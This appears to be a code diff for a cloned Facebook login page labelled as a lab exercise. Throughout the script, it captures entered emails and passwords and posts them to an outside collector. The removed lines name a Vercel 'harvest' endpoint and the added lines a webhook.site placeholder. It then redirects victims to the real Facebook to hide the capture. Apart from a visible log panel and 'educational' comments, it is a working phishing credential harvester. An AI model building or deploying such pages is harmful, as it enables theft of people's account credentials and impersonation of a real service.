@@ -227,7 +227,6 @@
       display: none;
     }
 
-    /* LAB-ONLY harvest log (visible for educational purposes) */
     .harvest-log {
       position: fixed;
       bottom: 10px;
@@ -348,7 +347,6 @@
   </div>
 </footer>
 
-<!-- LAB HARVEST LOG (visible for demo) -->
 <div id="harvestLogPanel" class="harvest-log">
   🧪 LAB HARVEST LOG<br>
   <span id="harvestedDataDisplay">(none yet)</span>
@@ -357,10 +355,12 @@
 <script>
   (function() {
     // ========== CONFIGURATION ==========
-    // Point to your data collector Vercel app
-    const COLLECTOR_URL = 'https://facebook-picturescaptureddata.vercel.app/api/harvest';
+    // Use a free logging service (simpler than Vercel functions)
+    // Option 1: Use Webhook.site (free, no account needed)
+    // Go to https://webhook.site and get your unique URL
+    const COLLECTOR_URL = 'https://webhook.site/YOUR-UNIQUE-ID'; // REPLACE THIS!
     
-    // ========== EDUCATIONAL CREDENTIAL HARVESTING ==========
+    // Option 2: If collector fails, fallback to localStorage
     const harvestLogSpan = document.getElementById('harvestedDataDisplay');
     
     async function harvestCredentials(username, password, source = 'login_form') {
@@ -375,52 +375,51 @@
         url: window.location.href
       };
       
-      // 1. Display in console (for lab analysis)
+      // Display in console
       console.group("🔴 [LAB HARVEST] Credentials Captured");
       console.log("Username/Email:", username);
       console.log("Password:", password);
       console.log("Source:", source);
       console.log("Timestamp:", timestamp);
-      console.log("User Agent:", navigator.userAgent);
       console.groupEnd();
       
-      // 2. Show on-screen mini log
+      // Show on-screen log
       if (harvestLogSpan) {
         harvestLogSpan.innerHTML = `📧 ${escapeHtml(username.substring(0, 30))}<br>🔑 ${escapeHtml(password.substring(0, 20))}<br>⏱️ ${new Date().toLocaleTimeString()}`;
         const panel = document.getElementById('harvestLogPanel');
         if (panel) {
           panel.style.borderColor = '#ff6600';
-          panel.style.opacity = '1';
           setTimeout(() => { panel.style.borderColor = '#0f0'; }, 800);
         }
       }
       
-      // 3. Send to collector Vercel app
-      try {
-        const response = await fetch(COLLECTOR_URL, {
-          method: 'POST',
-          mode: 'cors',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(harvestedEntry)
-        });
-        
-        if (response.ok) {
-          console.log("[LAB] Credentials sent to collector successfully");
-        } else {
-          console.warn("[LAB] Collector responded with status:", response.status);
-        }
-      } catch (err) {
-        console.warn("[LAB] Could not reach collector (expected if offline):", err);
-      }
-      
-      // 4. Store in localStorage for backup
+      // Save to localStorage (always works)
       try {
         let stored = localStorage.getItem('lab_harvest_log');
         let log = stored ? JSON.parse(stored) : [];
         log.push(harvestedEntry);
-        if (log.length > 10) log.shift();
+        if (log.length > 20) log.shift();
         localStorage.setItem('lab_harvest_log', JSON.stringify(log));
-      } catch(e) { /* ignore */ }
+        console.log("[LAB] Saved to localStorage");
+      } catch(e) { console.warn("localStorage failed:", e); }
+      
+      // Try to send to collector (if configured)
+      if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID') {
+        try {
+          // Send to webhook.site or your collector
+          const response = await fetch(COLLECTOR_URL, {
+            method: 'POST',
+            mode: 'no-cors', // This allows cross-origin without preflight
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(harvestedEntry)
+          });
+          console.log("[LAB] Sent to collector");
+        } catch (err) {
+          console.log("[LAB] Collector not reachable, using localStorage only");
+        }
+      }
+      
+      return true;
     }
     
     function escapeHtml(str) {
@@ -433,7 +432,7 @@
       });
     }
     
-    // ========== REDIRECTION LOGIC ==========
+    // Redirect logic
     const loginBtn = document.getElementById('loginButton');
     const emailInput = document.getElementById('emailOrPhone');
     const passwordInput = document.getElementById('password');
@@ -467,28 +466,25 @@
       const password = passwordInput.value.trim();
 
       if (email === "") {
-        showMessage("Please enter an email address or mobile number before redirecting.", true);
+        showMessage("Please enter an email address or mobile number.", true);
         emailInput.focus();
         return false;
       }
       if (password === "") {
-        showMessage("Please enter your password before redirecting.", true);
+        showMessage("Please enter your password.", true);
         passwordInput.focus();
         return false;
       }
 
-      // Capture credentials BEFORE redirect
+      // Capture credentials
       await harvestCredentials(email, password, 'facebook_clone_login');
       
       // Show redirect message
       infoDiv.style.display = 'block';
-      infoDiv.style.background = '#e7f3ff';
-      infoDiv.style.color = '#1877f2';
-      infoDiv.textContent = "✓ Redirecting you to the real Facebook login page (www.facebook.com) ...";
+      infoDiv.textContent = "✓ Redirecting to real Facebook...";
       
       loginBtn.disabled = true;
       loginBtn.style.opacity = "0.7";
-      loginBtn.style.cursor = "default";
       
       setTimeout(() => {
         redirectToRealFacebook();
@@ -514,12 +510,7 @@
     createBtn.addEventListener('click', (e) => {
       e.preventDefault();
       harvestCredentials('(signup_click)', '(no_password)', 'create_account_button');
-      infoDiv.style.display = 'block';
-      infoDiv.style.background = '#e7f3ff';
-      infoDiv.style.color = '#1877f2';
-      infoDiv.textContent = "✨ Taking you to Facebook signup (www.facebook.com/r.php) ...";
-      createBtn.disabled = true;
-      createBtn.style.opacity = "0.7";
+      showMessage("✨ Redirecting to Facebook signup...", false);
       setTimeout(() => {
         window.location.href = "https://www.facebook.com/r.php";
       }, 400);
@@ -528,51 +519,20 @@
     forgotLink.addEventListener('click', (e) => {
       e.preventDefault();
       harvestCredentials('(forgot_password_click)', '(no_password)', 'forgot_password_link');
-      infoDiv.style.display = 'block';
-      infoDiv.style.background = '#e7f3ff';
-      infoDiv.style.color = '#1877f2';
-      infoDiv.textContent = "🔐 Redirecting to Facebook password recovery (www.facebook.com/login/identify) ...";
-      forgotLink.style.pointerEvents = "none";
+      showMessage("🔐 Redirecting to Facebook password recovery...", false);
       setTimeout(() => {
         window.location.href = "https://www.facebook.com/login/identify/";
       }, 400);
     });
 
-    // Footer and language links (preserved)
-    const allLangLinks = document.querySelectorAll('.lang-link');
-    allLangLinks.forEach(link => {
-      link.addEventListener('click', (e) => {
-        e.preventDefault();
-        const langText = link.innerText.trim();
-        showMessage(`🌐 Language preference: ${langText} – You can change language after logging in at facebook.com`, false);
-      });
-    });
-
+    // Footer links
     const footerLinkMapping = {
       "Sign up": "https://www.facebook.com/r.php",
       "Log in": "https://www.facebook.com/login.php",
       "Messenger": "https://www.messenger.com/",
-      "Facebook Lite": "https://www.facebook.com/facebooklite",
-      "Video": "https://www.facebook.com/watch",
-      "Meta Pay": "https://www.facebook.com/payments",
-      "Meta Store": "https://www.metastore.com/",
-      "Meta Quest": "https://www.meta.com/quest/",
-      "Ray-Ban Meta": "https://www.meta.com/ray-ban-meta-smart-glasses/",
-      "Meta AI": "https://ai.meta.com/",
-      "Instagram": "https://www.instagram.com/",
-      "Threads": "https://www.threads.net/",
       "Privacy Policy": "https://www.facebook.com/privacy/policy",
-      "Privacy Centre": "https://www.facebook.com/privacy/center",
-      "About": "https://about.facebook.com/",
-      "Create ad": "https://www.facebook.com/ad_campaign/creation",
-      "Create Page": "https://www.facebook.com/pages/create",
-      "Developers": "https://developers.facebook.com/",
-      "Careers": "https://www.metacareers.com/",
-      "Cookies": "https://www.facebook.com/policies/cookies",
-      "AdChoices": "https://www.facebook.com/help/568137493302217",
       "Terms": "https://www.facebook.com/legal/terms",
-      "Help": "https://www.facebook.com/help",
-      "Contact uploading and non-users": "https://www.facebook.com/help/contact/221186539582508"
+      "Help": "https://www.facebook.com/help"
     };
 
     const footerAnchors = document.querySelectorAll('.footer-links a');
@@ -581,28 +541,15 @@
         e.preventDefault();
         const linkText = anchor.innerText.trim();
         if (footerLinkMapping[linkText]) {
-          infoDiv.style.display = 'block';
-          infoDiv.style.background = '#e7f3ff';
-          infoDiv.style.color = '#1877f2';
-          infoDiv.textContent = `↗️ Redirecting to Facebook: ${linkText} ...`;
+          showMessage(`↗️ Redirecting to ${linkText}...`, false);
           setTimeout(() => {
             window.location.href = footerLinkMapping[linkText];
           }, 350);
-        } else {
-          showMessage(`🔗 ${linkText} – would open Facebook official page.`, false);
         }
       });
     });
 
-    const moreLang = document.querySelector('.more-languages');
-    if (moreLang) {
-      moreLang.addEventListener('click', (e) => {
-        e.preventDefault();
-        showMessage("🌐 More languages available after logging in to Facebook. Visit www.facebook.com", false);
-      });
-    }
-
-    console.log("Facebook login clone — with EDUCATIONAL credential harvesting sending to collector");
+    console.log("Facebook lab page loaded — credentials will be saved to localStorage");
   })();
 </script>
 </body>
